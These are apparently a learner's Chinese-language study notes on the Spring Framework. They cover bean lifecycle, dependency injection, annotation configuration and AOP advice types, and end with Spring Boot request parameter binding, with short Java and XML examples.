* bean生命周期控制是什么?
  * 在bean创建后到销毁前做一些事情。

现在我们面临的问题是如何在bean的创建之后和销毁之前把我们需要添加的内容添加进去。

##### 4.3.1 生命周期的设置

接下来，在上面这个环境中来为BookDao添加生命周期的控制方法，具体的控制有两个阶段:

* bean创建之后，想要添加内容，比如用来初始化需要用到资源
* bean销毁之前，想要添加内容，比如用来释放用到的资源

针对这两个阶段，我们在BooDaoImpl类中分别添加两个方法，==方法名任意==

```java
public class BookDaoImpl implements BookDao {
    public void save() {
        System.out.println("book dao save ...");
    }
    //表示bean初始化对应的操作
    public void init(){
        System.out.println("init...");
    }
    //表示bean销毁前对应的操作
    public void destory(){
        System.out.println("destory...");
    }
}
```

在配置文件添加配置，如下:

```xml
<bean id="bookDao" class="com.itheima.dao.impl.BookDaoImpl" init-method="init" destroy-method="destory"/>
```

但是你会发现没有执行销毁后的程序，这是应为java的虚拟机关闭时ioc容器没来得及销毁和关闭，这样就需要我们手动关闭容器

##### 4.3.2 关闭容器

第一种方法：close()

* ApplicationContext中没有close方法

* 需要将ApplicationContext更换成ClassPathXmlApplicationContext

* 

  ```java
  ClassPathXmlApplicationContext ctx = new 
      ClassPathXmlApplicationContext("applicationContext.xml");
  ```

* 调用ctx的close()方法

  ```
  ctx.close();
  ```

第二种方法：注册钩子关闭容器

* 在容器未关闭之前，提前设置好回调函数，让JVM在退出之前回调此函数来关闭容器

* 调用ctx的registerShutdownHook()方法

  ```
  ctx.registerShutdownHook();
  ```


**注意:**registerShutdownHook在ApplicationContext中也没有

两种方式介绍完后，close和registerShutdownHook选哪个?

相同点:这两种都能用来关闭容器

不同点:close()是在调用的时候关闭，registerShutdownHook()是在JVM退出前调用关闭。

##### 4.3.3 官方控制生命周期

分析上面的实现过程，会发现添加初始化和销毁方法，即需要编码也需要配置，实现起来步骤比较多也比较乱。

Spring提供了两个接口来完成生命周期的控制，好处是可以不用再进行配置`init-method`和`destroy-method`

接下来在BookServiceImpl完成这两个接口的使用:

修改BookServiceImpl类，添加两个接口`InitializingBean`， `DisposableBean`并实现接口中的两个方法`afterPropertiesSet`和`destroy`

```java
public class BookServiceImpl implements BookService, InitializingBean, DisposableBean {
    private BookDao bookDao;
    public void setBookDao(BookDao bookDao) {
        this.bookDao = bookDao;
    }
    public void save() {
        System.out.println("book service save ...");
        bookDao.save(); 
    }
    //销毁方法
    public void destroy() throws Exception {
        System.out.println("service destroy");
    }
    //初始方法
    public void afterPropertiesSet() throws Exception {
        System.out.println("service init");
    }
}
```

这时我门就不需要再编写配置属性了

### 5、DI基础

#### 5.1 setter注入

##### 注入引用类型

1. 对于setter方式注入引用类型的方式之前已经学习过，快速回顾下:

* 在bean中定义引用类型属性，并提供可访问的==set==方法

```java
public class BookServiceImpl implements BookService {
    private BookDao bookDao;
    public void setBookDao(BookDao bookDao) {
        this.bookDao = bookDao;
    }
}
```

* 配置中使用==property==标签==ref==属性注入引用类型对象

```xml
<bean id="bookService" class="com.itheima.service.impl.BookServiceImpl">
     <!--property标签表示配置当前bean的属性
        		name属性表示配置哪一个具体的属性
        		ref属性表示参照哪一个bean

-引用多个时配置多个property就行了
		-->
	<property name="bookDao" ref="bookDao"/>
</bean>

<bean id="bookDao" class="com.itheima.dao.imipl.BookDaoImpl"/>
```

##### 注入简单类型

步骤1:声明属性并提供setter方法

在BookDaoImpl类中声明对应的简单数据类型的属性,并提供对应的setter方法

```java
public class BookDaoImpl implements BookDao {

    private String databaseName;
    private int connectionNum;

    public void setConnectionNum(int connectionNum) {
        this.connectionNum = connectionNum;
    }

    public void setDatabaseName(String databaseName) {
        this.databaseName = databaseName;
    }

    public void save() {
        System.out.println("book dao save ..."+databaseName+","+connectionNum);
    }
}
```

步骤2:配置文件中进行注入配置

在applicationContext.xml配置文件中使用property标签注入

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">

    <bean id="bookDao" class="com.itheima.dao.impl.BookDaoImpl">
        <property name="databaseName" value="mysql"/>
     	<property name="connectionNum" value="10"/>
    </bean>
    <bean id="userDao" class="com.itheima.dao.impl.UserDaoImpl"/>
    <bean id="bookService" class="com.itheima.service.impl.BookServiceImpl">
        <property name="bookDao" ref="bookDao"/>
        <property name="userDao" ref="userDao"/>
    </bean>
</beans>
```

**说明:**

value:后面跟的是简单数据类型，对于参数类型，Spring在注入的时候会自动转换，但是不能写成

```xml
<property name="connectionNum" value="abc"/>
```

这样的话，spring在将`abc`转换成int类型的时候就会报错。

* 对于引用数据类型使用的是`<property name="" ref=""/>`
* 对于简单数据类型使用的是`<property name="" value=""/>`

#### 5.2 构造器注入

##### 注入引用类型

与setter相同但是配置文件中的`<property name="" ref=""/>`变为`<constructor-arg name="" ref=""/>`

##### 注入简单类型

也与setter相同但是配置文件中的`<property name="" ref=""/>`变为`<constructor-arg name="" value=""/>`

 

介绍完两种参数的注入方式，具体我们该如何选择呢?

1. 强制依赖使用构造器进行，使用setter注入有概率不进行注入导致null对象出现

   * 强制依赖指对象在创建的过程中必须要注入指定的参数

2. 可选依赖使用setter注入进行，灵活性强

   * 可选依赖指对象在创建过程中注入的参数可有可无

3. Spring框架倡导使用构造器，第三方框架内部大多数采用构造器注入的形式进行数据初始化，相对严谨

4. 如果有必要可以两者同时使用，使用构造器注入完成强制依赖的注入，使用setter注入完成可选依赖的注入

5. 实际开发过程中还要根据实际情况分析，如果受控对象没有提供setter方法就必须使用构造器注入

6. **==自己开发的模块推荐使用setter注入==**

   

#### 5.3 自动配置

IoC容器根据bean所依赖的资源在容器中自动查找并注入到bean中的过程称为自动装配

自动装配的方式

* ==按类型（常用）==
* 按名称
* 按构造方法
* 不启用自动装配



**按类型**

接下来，在上面这个环境中来完成`自动装配`的学习:

自动装配只需要修改applicationContext.xml配置文件即可:

(1)将`<property>`标签删除

(2)在`<bean>`标签中添加autowire属性

首先来实现按照类型注入的配置

```java
 <bean id="bookService" class="com.itheima.service.impl.BookServiceImpl" autowire="byType"/>
```

==注意事项:==

* 需要注入属性的类中对应属性的setter方法不能省略
* 被注入的对象必须要被Spring的IOC容器管理
* 按照类型在Spring的IOC容器中如果找到多个对象，会报`NoUniqueBeanDefinitionException`



**按名称**

一个类型在IOC中有多个对象，还想要注入成功，这个时候就需要按照名称注入，配置方式为:

```xml
  <!--autowire属性：开启自动装配，通常使用按类型装配-->
    <bean id="bookService" class="com.itheima.service.impl.BookServiceImpl" autowire="byName"/>
```

按照名称注入中的名称指的是什么?

其实是和对应的set方法有关，但是如果按照标准起名称，属性名和set对应的名是一致的,再配置bean时，bean的id要与名称相同才能注入，即id要与属性名字相同



最后对于依赖注入，需要注意一些其他的配置特征:

1. 自动装配用于引用类型依赖注入，不能对简单类型进行操作
2. 使用按类型装配时（byType）必须保障容器中相同类型的bean唯一，推荐使用
3. 使用按名称装配时（byName）必须保障容器中具有指定名称的bean，因变量名与配置耦合，不推荐使用
4. 自动装配优先级低于setter注入与构造器注入，同时出现时自动装配配置失效

#### 5.4 集合注入

先来回顾下，常见的集合类型有哪些?

* 数组
* List
* Set
* Map
* Properties

再bean标签里面写相应的内容

##### 5.4.1 注入数组类型数据

```xml
<property name="array">
    <array>
        <value>100</value>
        <value>200</value>
        <value>300</value>
    </array>
</property>
```

5.4.2 注入List类型数据

```xml
<property name="list">
    <list>
        <value>itcast</value>
        <value>itheima</value>
        <value>boxuegu</value>
        <value>chuanzhihui</value>
    </list>
</property>
```

##### 5.4.3 注入Set类型数据

```xml
<property name="set">
    <set>
        <value>itcast</value>
        <value>itheima</value>
        <value>boxuegu</value>
        <value>boxuegu</value>
    </set>
</property>
```

##### 5.4.4 注入Map类型数据

```xml
<property name="map">
    <map>
        <entry key="country" value="china"/>
        <entry key="province" value="henan"/>
        <entry key="city" value="kaifeng"/>
    </map>
</property>
```

##### 5.4.5 注入Properties类型数据

```xml
<property name="properties">
    <props>
        <prop key="country">china</prop>
        <prop key="province">henan</prop>
        <prop key="city">kaifeng</prop>
    </props>
</property>
```

要是储存的元素时引用类型的就需要使用ref来应用bean

### 6、容器

这里所说的核心容器，大家可以把它简单的理解为`ApplicationContext`，前面虽然已经用到过，但是并没有系统的学习，接下来咱们从以下几个问题入手来学习下容器的相关知识:

* 如何创建容器?
* 创建好容器后，如何从容器中获取bean对象?
* 容器类的层次结构是什么?
* BeanFactory是什么?

#### 6.1 容器的创建方式

案例中创建`ApplicationContext`的方式为:

```java
ApplicationContext ctx = new ClassPathXmlApplicationContext("applicationContext.xml");
```

这种方式翻译为:==类路径下的XML配置文件==

除了上面这种方式，Spring还提供了另外一种创建方式为:

```java
ApplicationContext ctx = new FileSystemXmlApplicationContext("D:\\workspace\\spring\\spring_10_container\\src\\main\\resources\\applicationContext.xml"); 
```

这种方式翻译为:==文件系统下的XML配置文件==

**说明:**大家练习的时候，写自己的==绝对路径==。这种方式虽能实现，但是当项目的位置发生变化后,代码也需要跟着改,耦合度较高,不推荐使用。

**提示：配置多个文件使用逗号隔开**

#### 6.2 Bean的三种获取方式

方式一，就是目前案例中获取的方式:

```java
BookDao bookDao = (BookDao) ctx.getBean("bookDao");
```

这种方式存在的问题是每次获取的时候都需要进行类型转换，有没有更简单的方式呢?

方式二：

```
BookDao bookDao = ctx.getBean("bookDao"，BookDao.class);
```

这种方式可以解决类型强转问题，但是参数又多加了一个，相对来说没有简化多少。

方式三:

```
BookDao bookDao = ctx.getBean(BookDao.class);
```

这种方式就类似我们之前所学习依赖注入中的按类型注入。必须要确保IOC容器中该类型对应的bean对象只能有一个。

==**注意：通过的getBean获取实例的时候推荐获得实现类的接口实例这样减少类与类之间的耦合性，这也符合IOC的思想**==

#### 6.3 容器类层次结构

![image-20230804154040429](./img/小米虫爬山路-img/image-20230804154040429.png)

这是容器的实现过程.BeanFactory时总的接口

#### 6.4 总结

##### 容器

- BeanFactory是IoC容器的顶层接口，初始化BeanFactory对象时，加载的bean延迟加载
- ApplicationContext接口是Spring容器的核心接口，初始化时bean立即加载
- ApplicationContext接口提供基础的bean操作相关方法，通过其他接口扩展其功能
- ApplicationContext接口常用初始化类
  - **==ClassPathXmlApplicationContext(常用)==**
  - FileSystemXmlApplicationContext

##### bean相关

![image-20230804155327540](./img/小米虫爬山路-img/image-20230804155327540.png)

其实整个配置中最常用的就两个属性==id==和==class==。

把scope、init-method、destroy-method框起来的原因是，后面注解在讲解的时候还会用到，所以大家对这三个属性关注下。

##### 依赖注入相关

![image-20230804155348570](./img/小米虫爬山路-img/image-20230804155348570.png)

### 7、IOC/DI注解开发

Spring的IOC/DI对应的配置开发就已经讲解完成，但是使用起来相对来说还是比较复杂的，复杂的地方在==配置文件==。

前面咱们聊Spring的时候说过，Spring可以简化代码的开发，到现在并没有体会到。

所以Spring到底是如何简化代码开发的呢?

要想真正简化开发，就需要用到Spring的注解开发，Spring对注解支持的版本历程:

* 2.0版开始支持注解
* 2.5版注解功能趋于完善
* 3.0版支持纯注解开发

关于注解开发，我们会讲解两块内容`注解开发定义bean`和`纯注解开发`。

注解开发定义bean用的是2.5版提供的注解，纯注解开发用的是3.0版提供的注解。



#### 7.1 注解开发定义bean

在上述环境的基础上，我们来学一学Spring是如何通过注解实现bean的定义开发?

##### 步骤1:删除原XML配置

将配置文件中的`<bean>`标签删除掉

```xml
<bean id="bookDao" class="com.itheima.dao.impl.BookDaoImpl"/>
```

##### 步骤2:Dao上添加注解

在BookDaoImpl类上添加`@Component`注解

```java
@Component("bookDao")
public class BookDaoImpl implements BookDao {
    public void save() {
        System.out.println("book dao save ..." );
    }
}
```

==注意:@Component注解不可以添加在接口上，因为接口是无法创建对象的。==

XML与注解配置的对应关系:

![image-20230804161435132](./img/小米虫爬山路-img/image-20230804161435132.png)



##### 步骤3:配置Spring的注解包扫描

为了让Spring框架能够扫描到写在类上的注解，需要在配置文件上进行包扫描

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:context="http://www.springframework.org/schema/context"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
        http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd
        http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd">

    <context:component-scan base-package="com.itheima"/>

</beans>
```

**说明:**

component-scan

* component:组件,Spring将管理的bean视作自己的一个组件
* scan:扫描

base-package指定Spring框架扫描的包路径，它会扫描指定包及其子包中的所有类上的注解。

* 包路径越多[如:com.itheima.dao.impl]，扫描的范围越小速度越快
* 包路径越少[如:com.itheima],扫描的范围越大速度越慢
* 一般扫描到项目的组织名称即Maven的groupId下[如:com.itheima]即可。

除了@Component注解外Spring还给我们提供了三个衍生注解，这三个的作用和@Component一样

- @Controller:用于表现层bean定义
- @service :用于业务层bean定义
- @Repository :用于数据层bean定义



#### 7.2 纯注解开发

Spring3.0开启了纯注解开发模式，使用Java类替代配置文件，开启了Spring快速开发赛道，java类代替spring核心配置文件。



在配置类上添加包扫描注解`@ComponentScan`替换`<context:component-scan base-package=""/>`

```java
@Configuration
@ComponentScan("com.itheima")
//这个类就是配置类，取代了配置文件
public class SpringConfig {
}
```

![image-20230804163353850](./img/小米虫爬山路-img/image-20230804163353850.png)

* @Configuration注解用于设定当前类为配置类

* @ComponentScan注解用于设定扫描路径，此注解只能添加一次，多个数据请用数组格式

  ```
  @ComponentScan({com.itheima.service","com.itheima.dao"})
  ```

* 读取Spring核心配置文件初始化容器对象切换为读取Java配置类初始化容器对象

```java
//加载配置文件初始化容器
ApplicationContext ctx = new ClassPathXmlApplicationContext("applicationContext.xml");
//加载配置类初始化容器
ApplicationContext ctx = new AnnotationConfigApplicationContext(SpringConfig.class);
```

#### 7.3 注解bean管理

##### 7.3.1 bean作用范围

要是bean的是==非单例==的只需在：实现类上加入一个`@Scope("prototype")`来让bean为非单例，默认情况下bean是单例的

```java
@Repository
//@Scope设置bean的作用范围
@Scope("prototype")
public class BookDaoImpl implements BookDao {

    public void save() {
        System.out.println("book dao save ...");
    }
}
```

##### 7.3.2 bean生命周期

生命周期只需在方法上添加注解就行了。

开始：`@PostConstruct`

结束：`@PreDestroy`

```java
@Repository
public class BookDaoImpl implements BookDao {
    public void save() {
        System.out.println("book dao save ...");
    }
    @PostConstruct //在构造方法之后执行，替换 init-method
    public void init() {
        System.out.println("init ...");
    }
    @PreDestroy //在销毁方法之前执行,替换 destroy-method
    public void destroy() {
        System.out.println("destroy ...");
    }
}
```

==注意：非单例的bean没有生命周期==

#### 7.4 注解开发依赖注入

Spring开发时使用注解为了让开发更简便只保留了自动装配注入。

##### 引用属性

`@Autowired`：注入引用类型，自动装配模式，默认按类型装配。

`@Qualifier`：自动装配bean时按bean名称装配,`@Autowired`是使用这个注解的前置条件，指定加载哪个bean。

- 注意∶自动装配基于反射设计创建对象并暴力反射对应属性为私有属性初始化数据，因此无需提供setter方法
- 注意︰自动装配建议使用无参构造方法创建对象（默认），如果不提供对应构造方法，请提供唯一的构造方法

```java
@Service
public class BookServiceImpl implements BookService {
    @Autowired
    @Qualifier("bookDao1")
    private BookDao bookDao;
    
    public void save() {
        System.out.println("book service save ...");
        bookDao.save();
    }
}
```

##### 简单属性

使用`@Value`实现简单类型注入

```java
@Repository( "bookDao")
public class BookDaoImpl implements BookDao {
@Value( "100")
private string connectionNum;
}
```

 其中`@Value`的值是可以通过配置文件给的

在配置类中写入`@PropertySource(配置文件)`文件中写入要传入的值;

```properties
#配置文件中可以写入值
connectionNum = "100"
```

上述的简单属性可以使用`${}`来使用

```java
@Repository( "bookDao")
public class BookDaoImpl implements BookDao {
@Value( "${connectionNum}")
private string connectionNum;
}
```

#### 7.5 小结

总结图

![image-20230805215448993](./img/小米虫爬山路-img/image-20230805215448993.png)

### 8、AOP

前面已经对`IOC/DI`进行了系统的学习，接下来要学习它的另一个核心内容，就是==AOP==。

对于AOP,我们前面提过一句话是:==AOP是在不改原有代码的前提下对其进行增强。==

对于下面的内容，我们主要就是围绕着这一句话进行展开学习，主要学习两方面内容`AOP核心概念`,`AOP作用`

#### 8.1 AOP简介

##### 8.1.1 什么是AOP

* AOP(Aspect Oriented Programming)面向切面编程，一种编程范式，指导开发者如何组织程序结构。
* OOP(Object Oriented Programming)面向对象编程

我们都知道OOP是一种编程思想，那么AOP也是一种编程思想，编程思想主要的内容就是指导程序员该如何编写程序，所以它们两个是不同的`编程范式`。

##### 8.1.2 AOP作用

- 作用:在不惊动原始设计的基础上为其进行功能增强，前面咱们有技术就可以实现这样的功能即代理模式。

前面咱们有技术就可以实现这样的功能即`代理模式`。

![image-20230806101155929](./img/小米虫爬山路-img/image-20230806101155929.png)

在程序中找到公用的方法抽出写成`通知类`把抽出的方法写成通知方法，而程序中的所有方法就成为`连接点`，被通知类通知了的方法就叫做`切入点`即实现了功能增强了的方法,通知方法通过一个`切面`通知切入点实现某种功能，这个`切面`就是Spring提供的

至此AOP中的核心概念就已经介绍完了，总结下:

* 连接点(JoinPoint)：程序执行过程中的任意位置，粒度为执行方法、抛出异常、设置变量等
  * 在SpringAOP中，理解为方法的执行
* 切入点(Pointcut):匹配连接点的式子
  * 在SpringAOP中，一个切入点可以描述一个具体方法，也可也匹配多个方法
    * 一个具体的方法:如com.itheima.dao包下的BookDao接口中的无形参无返回值的save方法
    * 匹配多个方法:所有的save方法，所有的get开头的方法，所有以Dao结尾的接口中的任意方法，所有带有一个参数的方法
  * 连接点范围要比切入点范围大，是切入点的方法也一定是连接点，但是是连接点的方法就不一定要被增强，所以可能不是切入点。
* 通知(Advice):在切入点处执行的操作，也就是共性功能
  * 在SpringAOP中，功能最终以方法的形式呈现
* 通知类：定义通知的类
* 切面(Aspect):描述通知与切入点的对应关系。

#### 8.2 AOP实现流程

##### 8.2.1 第一步：环境搭建

创建一个Maven项目在pom.xml中导入Spring包和导入AspectJ的jar包,AspectJ是AOP思想的一个具体实现，Spring有自己的AOP实现，但是相比于AspectJ来说比较麻烦，所以我们直接采用Spring整合ApsectJ的方式进行AOP开发。

```xml
<dependencies>
    <dependency>
      <groupId>org.springframework</groupId>
      <artifactId>spring-context</artifactId>
      <version>5.2.10.RELEASE</version>
    </dependency>
    <dependency>
      <groupId>org.aspectj</groupId>
      <artifactId>aspectjweaver</artifactId>
      <version>1.9.4</version>
    </dependency>
  </dependencies>
```

##### 8.2.2 第二步：创建一些业务类

接口

```java
package Test.servie;

public interface Dao {
    public void save();

    public void update();

    public void delete();

    public void select();
}
```

实现类

```java
import org.springframework.stereotype.Repository;


@Repository//是Component的衍生注解
public class DaoImpl implements Dao {

    @Override
    public void save() {
        System.out.println(System.currentTimeMillis());
        System.out.println("book dao save ...");
    }
    @Override
    public void update(){
        System.out.println("book dao update ...");
    }
    @Override
    public void delete(){
        System.out.println("book dao delete ...");
    }
    @Override
    public void select(){
        System.out.println("book dao select ...");
    }
}
```

Spring配置类

```java
package Test.config;

import org.springframework.context.annotation.ComponentScan;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.EnableAspectJAutoProxy;

@Configuration
@ComponentScan("Test")
public class SpringConfig {
}
```

然后让实现类都写上`@Component`注解。

测试类

```java
package Test;

import Test.servie.Dao;
import Test.config.SpringConfig;
import org.springframework.context.ApplicationContext;
import org.springframework.context.annotation.AnnotationConfigApplicationContext;

public class Test {
    public static void main(String[] args) {
        ApplicationContext ctx = new AnnotationConfigApplicationContext(SpringConfig.class);
        Dao dao = ctx.getBean(Dao.class);
        dao.delete();
    }
}
```

##### 8.2.3 第三步：创建MyAdvice实现AOP功能

```java
import org.springframework.stereotype.Component;


//交给Spring管理
@Component
//让Spring知道这个并识别切入点
@Aspect
public class MyAdvice {


    //配置切入点
    @Pointcut("execution(void Test.servie.Dao.delete())")
    private void pt(){}


    //在执行原操作前执行这个方法
    @Before("pt()")
    public void method(){
        System.out.println(System.currentTimeMillis());
    }
}
```

##### 8.2.4 第四步：Spring管理

在配置类SpringConfig上添加`@EnableAspectJAutoProxy`注解告诉Spring有AOP开发。

#### 8.3 AOP切入点表达式

![image-20230806143240665](./img/小米虫爬山路-img/image-20230806143240665.png)

- 切入点∶要进行增强的方法
- 切入点表达式:要进行增强的方法的描述方式

对于切入点的描述，我们其实是有两中方式的，先来看下前面的例子

![image-20230806143522159](./img/小米虫爬山路-img/image-20230806143522159.png)

描述方式一：执行接口中的无参数update方法

```java
execution(void com.itheima.dao.BookDao.update())
```

描述方式二：执行实现类中的无参数update方法

```java
execution(void com.itheima.dao.impl.BookDaoImpl.update())
```

因为调用接口方法的时候最终运行的还是其实现类的方法，所以上面两种描述方式都是可以的。

##### 8.3.1 **语法格式**

对于切入点表达式的语法为:

`切入点表达式标准格式：动作关键字(访问修饰符  返回值  包名.类/接口名.方法名(参数) 异常名）`

动作关键字∶描述切入点的行为动作，例如execution表示执行到指定切入点

 访问修饰符和异常名都可省略

##### 8.3.2 **通配符**

我们使用通配符描述切入点，主要的目的就是简化之前的配置，具体都有哪些通配符可以使用?

* `*`:单个独立的任意符号，可以独立出现，也可以作为前缀或者后缀的匹配符出现

  ```
  execution（public * com.itheima.*.UserService.find*(*))
  ```

  匹配com.itheima包下的任意包中的UserService类或接口中所有find开头的带有一个参数的方法

* `..`：多个连续的任意符号，可以独立出现，常用于简化包名与参数的书写

  ```
  execution（public User com..UserService.findById(..))
  ```

  匹配com包下的任意包中的UserService类或接口中所有名称为findById的方法

* `+`：专用于匹配子类类型

  ```
  execution(* *..*Service+.*(..))
  ```

  这个使用率较低，描述子类的，咱们做JavaEE开发，继承机会就一次，使用都很慎重，所以很少用它。*Service+，表示所有以Service结尾的接口的子类。

##### 8.3.3 **书写技巧**

对于切入点表达式的编写其实是很灵活的，那么在编写的时候，有没有什么好的技巧让我们用用:

- 所有代码按照标准规范开发，否则以下技巧全部失效
- 描述切入点通**==常描述接口==**，而不描述实现类,如果描述到实现类，就出现紧耦合了
- 访问控制修饰符针对接口开发均采用public描述（**==可省略访问控制修饰符描述==**）
- 返回值类型对于增删改类使用精准类型加速匹配，对于查询类使用\*通配快速描述
- **==包名==**书写**==尽量不使用..匹配==**，效率过低，常用\*做单个包描述匹配，或精准匹配
- **==接口名/类名==**书写名称与模块相关的**==采用\*匹配==**，例如UserService书写成\*Service，绑定业务层接口名
- **==方法名==**书写以**==动词==**进行**==精准匹配==**，名词采用*匹配，例如getById书写成getBy*,selectAll书写成selectAll
- 参数规则较为复杂，根据业务方法灵活调整
- 通常**==不使用异常==**作为**==匹配==**规则

#### 8.4 AOP通知类型

![image-20230806151523245](./img/小米虫爬山路-img/image-20230806151523245.png)

它所代表的含义是将`通知`添加到`切入点`方法执行的==前面==。

除了这个注解外，还有没有其他的注解，换个问题就是除了可以在前面加，能不能在其他的地方加?

##### 8.4.1 前置通知

```java
//@Before：前置通知，在原始方法运行之前执行
@Before("pt()")
    public void before() {
        System.out.println("这是前置通知");
    }
```

##### 8.4.2 后置通知

```java
//@After：后置通知，在原始方法运行之后执行
    @After("pt2()")
    public void after() {
        System.out.println("这是后置通知");
    }
```

##### 8.4.3 环绕通知(重点)

可以做其他的所有效果

```java
//@Around：环绕通知，在原始方法运行的前后执行
    @Around("pt()")
    public Object around(ProceedingJoinPoint pjp) throws Throwable {
        System.out.println("这是环绕通知中前置通知");
        //表示对原始操作的调用
        Object ret = pjp.proceed();
        System.out.println("这是环绕通知中hou置通知");
        return ret;
    }

    //    @Around("pt2()")
    public Object aroundSelect(ProceedingJoinPoint pjp) throws Throwable {
        System.out.println("这是环绕通知中后置通知");
        //表示对原始操作的调用
        Integer ret = (Integer) pjp.proceed();
        System.out.println("这是环绕通知中后置通知");
        return ret;
    }
```

==**环绕通知注意事项**==

1. 环绕通知必须依赖形参ProceedingJoinPoint才能实现对原始方法的调用，进而实现原始方法调用前后同时添加通知
2. 通知中如果未使用ProceedingJoinPoint对原始方法进行调用将跳过原始方法的执行
3. 对原始方法的调用可以不接收返回值，通知方法设置成void即可，如果接收返回值，最好设定为Object类型
4. 原始方法的返回值如果是void类型，通知方法的返回值类型可以设置成void,也可以设置成Object
5. 由于无法预知原始方法运行后是否会抛出异常，因此环绕通知方法必须要处理Throwable异常

##### 8.4.4 返回

```java
 //@AfterReturning：返回后通知，在原始方法执行完毕后运行，且原始方法执行过程中未出现异常现象       
   @AfterReturning("pt()")
    public void afterReturning() {
        System.out.println("这是返回通知");
    }
```

##### 8.4.5 异常抛出通知

```java
//@AfterThrowing：抛出异常后通知，在原始方法执行过程中出现异常后运行
    @AfterThrowing("pt()")
    public void afterThrowing() {
        System.out.println("这是抛出异常后通知");
    }
```

#### 8.5 AOP通知获取数据

##### 获取参数

方式一：非环绕通知 通过`JoinPoint`参数来获取，调用`JoinPoint`对象中的`getArgs()`方法来得到参数列表

```java
 @Before("pt()")
    public void before(JoinPoint jp) 
        Object[] args = jp.getArgs();
        System.out.println(Arrays.toString(args));
        System.out.println("前置通知" );
    }

```

注意：此方法只适用于非环绕通知类型,且`JoinPoint`必须放在第一位

方式二：环绕通知 通过`ProceedingJoinPoint`参数来获取，和`JoinPoint`一样调用相同的方法

```java
@Around("pt()")
    public Object around(ProceedingJoinPoint pjp) throws Throwable{
        Object[] args = pjp.getArgs();
        System.out.println(Arrays.toString(args));
        args[0] = 666;
        Object ret = pjp.proceed(args);
        return ret;
    }
```

##### 获取返回值

方式一：返回后通知

在标签`AfterReturing`添加一个returning = "返回值"

```java
 @AfterReturning(value = "pt()",returning = "ret")//ret就是返回值
    public void afterReturning(Object ret) {
        System.out.println("afterReturning advice ..."+ret);
    }
```

方式二：环绕通知

```java
 @Around("pt()")
    public Object around(ProceedingJoinPoint pjp) throws Throwable{
        Object[] args = pjp.getArgs();
        System.out.println(Arrays.toString(args));
        args[0] = 666;
        Object ret = pjp.proceed(args);
        return ret;
    }
```

##### 获取异常

方式一：抛出异常后通知

添加参数`Throwable`这个就是异常对象

方式二：环绕通知，使用try catch捕获异常

##### 总结

* 获取切入点方法的参数，所有的通知类型都可以获取参数
  * JoinPoint：适用于前置、后置、返回后、抛出异常后通知
  * ProceedingJoinPoint：适用于环绕通知
* 获取切入点方法返回值，前置和抛出异常后通知是没有返回值，后置通知可有可无，所以不做研究
  * 返回后通知
  * 环绕通知
* 获取切入点方法运行异常信息，前置和返回后通知是不会有，后置通知可有可无，所以不做研究
  * 抛出异常后通知
  * 环绕通知

## 九、SpringMVC

### 1、简介

MVC：是一种架构模式，将业务逻辑和页面展示分离，使程序分层、分工合作，既相互独立，又协同合作。

MVC是模型(Model)、视图(View)、控制器(Controller)的简写，是一种软件设计规范。

**Model**（模型）：数据模型，提供要展示的数据，因此包含数据和行为，可以认为是领域模型或 JavaBean组件，不过现在一般都分离开来：Value Object（数据Dao） 和 服务层（行为Service）。也就是模型提供了模型数据查询和模型数据的状态更新等功能，包括数据和业务。

**View**（视图）：负责进行模型的展示，将逻辑视图解析成物理视图并渲染。

**Controller**（控制器）：接收用户请求，委托给模型进行处理，处理完毕后把返回的模型数据返回给视图，由视图负责展示。起调度作用。

### 2、SpringMVC的工作原理图

![image-20230803192604422](./img/小米虫爬山路-img/image-20230803192604422.png)



## 十、SpringBoot

![image-20230809090151604](./img/小米虫爬山路-img/image-20230809090151604.png)



### 1、SpringBoot请求

使用Postman来测试后端：![image-20230808224437580](./img/小米虫爬山路-img/image-20230808224437580.png)

#### 1.1简单参数

简单参数：在向服务器发起请求时，向服务器传递的是一些普通的请求数据。

在Springboot的环境中，对原始的API进行了封装，接收参数的形式更加简单。 如果是简单参数，参数名与形参变量名相同，定义同名的形参即可接收参数。

```java
@RestController
public class RequestController {
    // http://localhost:8080/simpleParam?name=Tom&age=10
    // 第1个请求参数： name=Tom   参数名:name，参数值:Tom
    // 第2个请求参数： age=10     参数名:age , 参数值:10
    
    //springboot方式
    @RequestMapping("/simpleParam")
    public String simpleParam(String name , Integer age ){//形参名和请求参数名保持一致
        System.out.println(name+"  :  "+age);
        return "OK";
    }
}
```

> **结论：不论是GET请求还是POST请求，对于简单参数来讲，只要保证==请求参数名和Controller方法中的形参名保持一致==，就可以获取到请求参数中的数据值。**
>
> 

如果方法形参名称与请求参数名称不一致，controller方法中的形参还能接收到请求参数值吗？

答案：运行错误，相应写错名字形参会变成null

那么如果我们开发中，遇到了这种请求参数名和controller方法中的形参名不相同，怎么办？

解决方案：可以使用Spring提供的@RequestParam注解完成映射

在方法形参前面加上 @RequestParam 然后通过value属性执行请求参数名，从而完成映射。代码如下：

```java
@RestController
public class RequestController {
    // http://localhost:8080/simpleParam?name=Tom&age=20
    // 请求参数名：name

    //springboot方式
    @RequestMapping("/simpleParam")
    public String simpleParam(@RequestParam("name") String username , Integer age ){
        System.out.println(username+"  :  "+age);
        return "OK";
    }
}
```

**注意事项：**

@RequestParam中的required属性默认为true（默认值也是true），代表该请求参数必须传递，如果不传递将报错

#### 1.2 实体参数

在使用简单参数做为数据传递方式时，前端传递了多少个请求参数，后端controller方法中的形参就要书写多少个。如果请求参数比较多，通过上述的方式一个参数一个参数的接收，会比较繁琐。 

此时，我们可以考虑将请求参数封装到一个实体类对象中。 要想完成数据封装，需要遵守如下规则：**请求参数名与实体类的属性名相同**

![image-20230808230401349](./img/小米虫爬山路-img/image-20230808230401349.png)

```java
@RestController
public class RequestController {
    //实体参数：简单实体对象
    @RequestMapping("/simplePojo")
    public String simplePojo(User user){
        System.out.println(user);
        return "OK";
    }
}
```

上面我们讲的呢是简单的实体对象，下面我们在来学习下复杂的实体对象。

复杂实体对象指的是，在实体类中有一个或多个属性，也是实体对象类型的。如下：

